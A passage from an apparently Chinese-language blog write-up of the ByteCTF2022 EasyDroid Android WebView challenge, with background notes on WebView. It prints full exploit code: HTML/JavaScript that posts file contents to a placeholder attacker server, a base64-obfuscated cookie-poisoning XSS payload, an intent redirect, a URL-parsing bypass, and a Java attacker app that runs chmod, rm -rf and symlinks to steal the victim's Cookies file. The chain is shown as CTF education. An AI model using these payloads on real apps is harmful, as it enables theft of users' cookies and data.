class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">cmdexec</span><span class="params">(String s)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Waiting to steal cookies...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> d = <span class="variable language_">document</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">loadDatabase</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> file_url = d.<span class="property">URL</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://YOUR_SERVER_IP:4080&quot;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">setRequestHeader</span>(</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;Content-Type&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span></span><br><span class="line"><span class="language-javascript">            );</span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">send</span>(</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;file_content=&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">                <span class="built_in">encodeURIComponent</span>(xmlhttp.<span class="property">responseText</span>)</span></span><br><span class="line"><span class="language-javascript">            );</span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, file_url);</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(loadDatabase, <span class="number">8000</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>获取当前页面 URL（攻击的锚点）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var file_url = d.URL;</span><br></pre></td></tr></table></figure><p>如果 WebView 当前打开的是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///data/data/com.bytectf.pwneasydroid/files/attack.html</span><br></pre></td></tr></table></figure><p>那么：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_url === &quot;file:///data/data/com.bytectf.pwneasydroid/files/attack.html&quot;</span><br></pre></td></tr></table></figure><p>第一个 XMLHttpRequest：读取当前文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var xmlhttp = new XMLHttpRequest();</span><br><span class="line">xmlhttp.open(&quot;GET&quot;, file_url);</span><br><span class="line">xmlhttp.send(null);</span><br></pre></td></tr></table></figure><blockquote><p><strong>用 JS 去读当前这个 file:&#x2F;&#x2F; URL 的内容”</strong></p></blockquote><p>在正常情况下，它会读到 <code>attack.html</code> 自己。</p><p>但在攻击中：</p><ul><li>attack.html 被删掉</li><li>同路径被换成 <strong>指向 Cookies 的符号链接</strong></li></ul><p>读完会发送给攻击者，发送 Cookies 内容:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.send(&quot;file_content=&quot; + encodeURIComponent(xmlhttp.responseText));</span><br></pre></td></tr></table></figure><p>evil.html:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> location.<span class="property">href</span>=<span class="string">&quot;intent:easydroidpwn#Intent;launchFlags=0x3;package=com.bytectf.easydroid;component=com.bytectf.easydroid/.TestActivity;S.url=file:///data/data/com.bytectf.easydroidpwn/files/attack.html;end&quot;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260121204404148.png" alt="image-20260121204404148"></p><p>总结其实就是给easydroid发一个intent里面是evil.html，然后easydroid里的Mainactivityload evil.html里的webview执行js，给TestActivity发了个intent Url去执行attack.html里的js，这时让它去读attack.html，但是有8秒的延时机制，此间会把attack.html删了，软链接到cookies。</p><p>为什么不能直接读Cookies，在attack.html里，因为之前也讲了不能直接在 <code>evil.html</code> 里让 WebView 读取 Cookies 文件，是因为：<br> WebView 的同源策略仍然生效，<code>file://</code> 页面不能直接读取“其他路径”的 <code>file://</code> 文件。</p><p>攻击链：<strong>Intent → EasyDroid MainActivity WebView → evil.html → intent → TestActivity WebView → attack.html → 延时 → symlink → 读取 Cookies</strong></p><p>setAllowFileAccess(true)</p><blockquote><p><strong>允许 WebView 访问 <code>file://</code> 本地文件。</strong></p></blockquote><p>setAllowUniversalAccessFromFileURLs </p><blockquote><p><strong>允许 <code>file://</code> 页面访问任意网络资源（http&#x2F;https）</strong>，即“file → internet 跨源”</p></blockquote><p>简单的发起请求不算</p><p>setAllowUniversalAccessFromFileURLs 主要是：</p><ul><li>针对 <strong>更严格的跨源场景</strong></li><li>特别是较新 Android &#x2F; Chromium 版本</li></ul><blockquote><p><strong>符号链接 + TOCTOU + file:&#x2F;&#x2F;）在 Android 8 及以上逐渐失效，是因为 WebView &#x2F; Chromium 开始对 <code>file://</code> 资源进行更严格的隔离与校验，核心变化是：文件访问不再只信 URL，而是引入了更严格的文件句柄、真实路径校验和进程隔离，导致 symlink + 时间差攻击窗口被堵死。</strong></p></blockquote><h3 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h3><p><strong>污染Cookies窃取数据</strong>:在这个方案里，需要先通过访问恶意HTML将恶意js插入Cookies中，然后控制被攻击APP访问Cookies本身，触发恶意代码造成数据泄露</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260121213354608.png" alt="image-20260121213354608"></p><p>具体的攻击思路:  </p><blockquote><p>首先攻击者APP跳转到被攻击APP的MainActivity，使其访问evil.html在该恶意html中设置cookies并且延时40s执行intent跳转，设置cookies即设置恶意代码，等待后续被读取渲染时运行恶意代码，即等待cookies写入到被攻击APP目录下的Cookies文件中后跳转到TestActivity ，然后TestActivity 加载url：file:&#x2F;&#x2F;&#x2F;data&#x2F;data&#x2F;com.bytectf.pwneasydroid&#x2F;files&#x2F;symlink.html ，这个url将会读取pwneasydroid数据目录下的一个symlin.html，该html创建于跳转到被攻击MainActivity至跳转到TestActivity这段时间，使其指向&#x2F;data&#x2F;data&#x2F;com.bytectf.easydroid&#x2F;app_webview&#x2F;Cookies ，然后TestActivity 中webview加载时触发到插入到Cookies里的恶意代码，使其读取Cookies本身并且发送到远程，即可成功实现Cookies泄露，flag就在Cookies中</p><p>这里需要格外注意权限问题：不仅需要给&#x2F;data&#x2F;data&#x2F;com.bytectf.pwneasydroid&#x2F;files 及目录下的文件777权限，而且还要给&#x2F;data&#x2F;data&#x2F;com.bytectf.pwneasydroid 这个目录的777权限，否则将会访问失败</p></blockquote><p>来自LLeaves</p><p>核心是两步：</p><ol><li>污染：让受害 App 的 Cookies 数据库里出现“可执行的恶意 JS 字符串</li><li>触发：让受害 App 的 WebView 去加载Cookies这个文件（SQLite），并把它当成网页内容解析；当解析到插入的那段 JS 时执行，把 Cookies文件内容发出来</li></ol><blockquote><p>也就是说：<strong>不是直接读取 Cookies 文件</strong>（同源&#x2F;权限会拦），而是让 WebView 自己读并执行Cookies里你塞进去的 payload。</p></blockquote><p>Step 1：攻击 App 启动 EasyDroid MainActivity，加载 evil.html</p><ul><li>通过 <code>http://toutiao.com@attacker/evil.html</code> 绕过 <code>contains(&quot;toutiao.com&quot;)</code></li><li>EasyDroid 的 MainActivity WebView 加载 evil.html</li><li>evil.html 做两件事：<ol><li>document.cookie &#x3D; …（或其他方式）把恶意字符串写入 Cookie（最终落入 app_webview&#x2F;Cookies SQLite）</li><li>setTimeout(…, 40s) 延迟后再跳 intent（等 Cookie 写盘）</li></ol></li></ul><p><strong>为什么要延迟？</strong>因为 Cookie 写入 SQLite 不是你发一行 JS 就立刻落盘，有缓存&#x2F;异步；延迟是为了保证恶意 payload 已经写进 Cookies 文件。</p><p>evil.html:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">cookie</span>=<span class="string">&quot;x = &#x27;&lt;img src=\&quot;x\&quot; onerror=\&quot;eval(atob(&#x27;eGhyPW5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignUE9TVCcsICdodHRwOi8veHh4Lnh4eC54eHgueHh4OjQwODAnLCB0cnVlKTsgeGhyLnNldFJlcXVlc3RIZWFkZXIoJ0NvbnRlbnQtVHlwZScsICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnKTsgeGhyLnNlbmQoJ2h0bWw9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQub3V0ZXJIVE1MKSk7&#x27;))\&quot;&gt;&#x27;&quot;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        location.<span class="property">href</span> = <span class="string">&quot;intent:pwneasydroid#Intent;package=com.bytectf.easydroid;component=com.bytectf.easydroid/.TestActivity;S.url=file:///data/data/com.bytectf.pwneasydroid/files/symlink.html;end&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">40000</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>只有两步：</strong></p><ol><li><strong>污染 Cookies</strong></li><li><strong>延时 40 秒 → 触发 TestActivity</strong></li></ol><p>Cookie 名：x，写了一个x肯定不会成功的地址img，然后执行onerror里的js代码，里面经过base64编码，避免转义</p><p>解码后是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xhr = new XMLHttpRequest();</span><br><span class="line">xhr.open(&quot;POST&quot;, &quot;http://xxx.xxx.xxx.xxx:4080&quot;, true);</span><br><span class="line">xhr.setRequestHeader(</span><br><span class="line">  &quot;Content-Type&quot;,</span><br><span class="line">  &quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">);</span><br><span class="line">xhr.send(</span><br><span class="line">  &quot;html=&quot; + encodeURIComponent(document.documentElement.outerHTML)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>这段 JS 的效果：</p><ul><li>创建 XHR</li><li>向服务器 4080端口 POST</li><li>发送的内容是：当前 WebView 正在解析的整个 HTML 文档</li></ul><p><strong>注意：此时“正在解析的 HTML 文档”是什么？</strong></p><p><strong>是 Cookies 文件本身（通过 symlink.html 加载）</strong></p><p>为什么Cookie 里的代码会被执行?</p><p>TestActivity：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webView.loadUrl(&quot;file:///.../symlink.html&quot;);</span><br><span class="line">symlink.html → /data/data/com.bytectf.easydroid/app_webview/Cookies</span><br></pre></td></tr></table></figure><p>WebView 把 <strong>Cookies SQLite 文件</strong>当成文本流</p><p>SQLite 文件里包含你写入的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img ... onerror=...&gt;</span><br></pre></td></tr></table></figure><p>WebView HTML 解析器扫描到这段</p><p>img加载失败 → onerror执行</p><p><strong>JS 执行成功，Cookies 文件被外传</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(function() &#123;</span><br><span class="line">    location.href = &quot;intent:...&quot;</span><br><span class="line">&#125;, 40000);</span><br></pre></td></tr></table></figure><p>为什么一定要延迟？</p><p>因为：</p><ul><li>document.cookie &#x3D; …</li><li><strong>不等于立刻写入 SQLite</strong></li><li>Chromium Cookie 写盘：<ul><li>有缓存</li><li>有异步</li></ul></li><li>如果马上跳 TestActivity：symlink.html 可能指向的是<strong>还没写入 payload 的 Cookies</strong></li></ul><p>intent 这一段在干嘛？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">intent:pwneasydroid#Intent;</span><br><span class="line">package=com.bytectf.easydroid;</span><br><span class="line">component=com.bytectf.easydroid/.TestActivity;</span><br><span class="line">S.url=file:///data/data/com.bytectf.pwneasydroid/files/symlink.html;</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ul><li><p>利用 MainActivity 中 <code>shouldOverrideUrlLoading</code></p></li><li><p>让 EasyDroid <strong>自己启动 TestActivity</strong></p></li><li><p>并传入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = file:///.../symlink.html</span><br></pre></td></tr></table></figure></li></ul><p>TestActivity 的 WebView 就会加载 Cookies（通过 symlink）。</p><blockquote><p>evil.html 首先通过 <code>document.cookie</code> 将包含恶意 HTML&#x2F;JavaScript 的 payload 写入 Chromium Cookies 数据库；待数据写盘后，通过延时触发 intent 跳转，启动 TestActivity 并加载指向 Cookies 文件的符号链接页面。WebView 在解析 Cookies 文件时执行被污染的 payload，通过 XHR 将 Cookies 内容（包含 flag）回传至攻击者服务器。</p></blockquote><p>Step B：evil.html 再触发 intent 启动 TestActivity，并让它加载一个 file:&#x2F;&#x2F; URL</p><p>这里选择让 TestActivity 加载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///data/data/com.bytectf.pwneasydroid/files/symlink.html</span><br></pre></td></tr></table></figure><p>而攻击 App 这段时间里创建了：</p><ul><li><p>&#x2F;data&#x2F;data&#x2F;com.bytectf.pwneasydroid&#x2F;files&#x2F;symlink.html <strong>是一个 symlink</strong></p></li><li><p>它指向：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/data/com.bytectf.easydroid/app_webview/Cookies</span><br></pre></td></tr></table></figure></li></ul><p>Step 3：TestActivity 的 WebView loadUrl(file:&#x2F;&#x2F;&#x2F;…&#x2F;symlink.html)</p><p>结果就是：</p><blockquote><p>WebView 实际读到的是 <strong>EasyDroid 的 Cookies SQLite 文件</strong> 内容。</p></blockquote><p>然后关键点来了：<strong>SQLite 文件里包含之前塞进去的恶意 JS 字符串</strong>（以 cookie value 的形式存在）。</p><p>在某些 WebView&#x2F;解析路径里，这段字符串可能被当成 HTML&#x2F;JS 的一部分执行&#x2F;触发，从而发起 XHR 把 Cookies 内容外传。</p><blockquote><p>这就是污染 Cookies → 再加载 Cookies 本身触发执行 → 外传的套路。</p></blockquote><p>MainActivity:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwneasydroid2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.activity.EdgeToEdge;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> androidx.core.graphics.Insets;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.ViewCompat;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.WindowInsetsCompat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;PwnAndroid&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            attack();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException | IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">jumpToApp</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.easydroid&quot;</span>,<span class="string">&quot;com.bytectf.easydroid.MainActivity&quot;</span>);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;http://toutiao.com@xxx.xxx.xxx.xxx/evil.html&quot;</span>);</span><br><span class="line">        intent.setData(data);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException, IOException &#123;</span><br><span class="line">        jumpToApp();</span><br><span class="line">        <span class="type">String</span> <span class="variable">root</span> <span class="operator">=</span> getApplicationInfo().dataDir;</span><br><span class="line">        cmdexec(<span class="string">&quot;chmod -R 777 &quot;</span> + root);</span><br><span class="line">        Log.d(<span class="string">&quot;path&quot;</span>, root);</span><br><span class="line">        <span class="type">String</span> <span class="variable">sympath</span> <span class="operator">=</span> root + <span class="string">&quot;/files&quot;</span> + <span class="string">&quot;/symlink.html&quot;</span>;</span><br><span class="line">        cmdexec(<span class="string">&quot;rm -rf &quot;</span>+ root + <span class="string">&quot;/files&quot;</span>);</span><br><span class="line">        cmdexec(<span class="string">&quot;mkdir &quot;</span>+ root + <span class="string">&quot;/files&quot;</span>);</span><br><span class="line">        cmdexec(<span class="string">&quot;chmod -R 777 /data/data/com.bytectf.pwneasydroid/files&quot;</span>);</span><br><span class="line">        cmdexec(<span class="string">&quot;ln -s &quot;</span> + <span class="string">&quot;/data/data/com.bytectf.easydroid/app_webview/Cookies&quot;</span> + <span class="string">&quot; &quot;</span> + sympath);</span><br><span class="line">        cmdexec(<span class="string">&quot;chmod -R 777 &quot;</span> + root + <span class="string">&quot;/files&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">cmdexec</span><span class="params">(String s)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(s).waitFor();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重建 files&#x2F; 目录，确保干净</p><p>Android11实测无法成功</p><blockquote><p>在 Android 11 环境中，SELinux 处于强制 Enforcing 状态，通过 <code>setenforce</code> 动态切换仍无法成功，导致应用无法跨越私有数据目录访问其他应用的 <code>file://</code> 资源。即使符号链接与文件权限正确配置，WebView 在 Enforcing 模式下仍会返回 <code>ERR_FILE_NOT_FOUND</code>。因此该攻击方案仅在 SELinux 放宽或旧版本 Android 环境中可行，此外Android高版本的Cookies文件在&#x2F;app&#x2F;webview&#x2F;Default&#x2F;Cookies目录下</p></blockquote><blockquote><p> WebView 在解析 <code>file://</code> 时，会做 realpath &#x2F; canonical path 校验，一旦发现路径“起点在 A App 私有目录，但真实目标在 B App 私有目录，<br> 就直接拒绝加载。这是 <strong>Chromium WebView 在 Android 10+ 引入的安全加固</strong></p></blockquote><p>Android 8.1:</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260121230618633.png" alt="image-20260121230618633"></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260121230640877.png" alt="image-20260121230640877"></p><h2 id="一些补充知识"><a href="#一些补充知识" class="headerlink" title="一些补充知识"></a>一些补充知识</h2><h3 id="Webview"><a href="#Webview" class="headerlink" title="Webview"></a>Webview</h3><p>来自[<a href="https://bbs.kanxue.com/thread-275379-1.htm#msg_header_h2_0">原创]ByteCTF2022 mobile系列-Android安全-看雪安全社区｜专业技术交流与安全研究论坛</a></p><blockquote><p><strong>WebView 是 Android 提供的一个组件，用来在 App 内部显示和运行网页内容，本质上是一个嵌入在 App 里的浏览器。</strong></p><p>它让开发者可以：</p><ul><li>不跳转外部浏览器</li><li>在 App 内直接加载：<ul><li>HTML</li><li>CSS</li><li>JavaScript</li><li>网络页面 &#x2F; 本地页面</li></ul></li></ul><p>WebView 底层是 <strong>Chromium</strong></p><table><thead><tr><th>对比点</th><th>浏览器</th><th>WebView</th></tr></thead><tbody><tr><td>运行环境</td><td>系统级</td><td>App 私有</td></tr><tr><td>权限</td><td>浏览器自身</td><td><strong>继承 App 权限</strong></td></tr><tr><td>Cookie</td><td>浏览器</td><td><strong>App 私有目录</strong></td></tr><tr><td>Intent</td><td>受限</td><td><strong>可被 App 接管</strong></td></tr><tr><td>exported 校验</td><td>有</td><td><strong>可能被绕过</strong></td></tr></tbody></table></blockquote><p>很多App中都会内置html5界面，有时候会涉及到与android进行交互，这就需要用到WebView控件，WebView可以做到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.显示和渲染web界面</span><br><span class="line">2.直接使用html进行布局</span><br><span class="line">3.与js进行交互</span><br></pre></td></tr></table></figure><p>创建WebView拥有两种方法，</p><p>第一种方法是WebView webview &#x3D; new WebView(getApplicationContext());创建；</p><p>第二种是在xml文件内放在布局中；下面以第二种方法为例</p><p>如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// WebView</span></span><br><span class="line">    <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> (WebView) findViewById(R.id.eeeewebview);</span><br><span class="line">    webView.loadUrl(<span class="string">&quot;https://www.baidu.com&quot;</span>);</span><br><span class="line">    webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">            <span class="comment">//使用WebView加载显示url</span></span><br><span class="line">            view.loadUrl(url);</span><br><span class="line">            <span class="comment">//返回true</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><blockquote><p><strong>这个 Activity 创建了一个 WebView，用它加载百度首页，并且通过 <code>shouldOverrideUrlLoading</code> 确保所有页面跳转都仍然在当前 WebView 内部完成，而不是跳到系统浏览器。</strong></p></blockquote><p>设置 WebViewClient</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webView.setWebViewClient(new WebViewClient()&#123;</span><br></pre></td></tr></table></figure><p>默认情况下：</p><ul><li>WebView 遇到跳转（如点击链接）</li><li><strong>可能会调用系统浏览器</strong></li></ul><p>设置 WebViewClient&#96;的目的：</p><ul><li><strong>拦截 WebView 的行为</strong></li><li>告诉系统：我自己处理跳转</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">    view.loadUrl(url);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>无论 WebView 想跳转到哪个 URL，都不要交给系统处理，我自己在当前 WebView 里加载。</p></blockquote><h3 id="URI补充"><a href="#URI补充" class="headerlink" 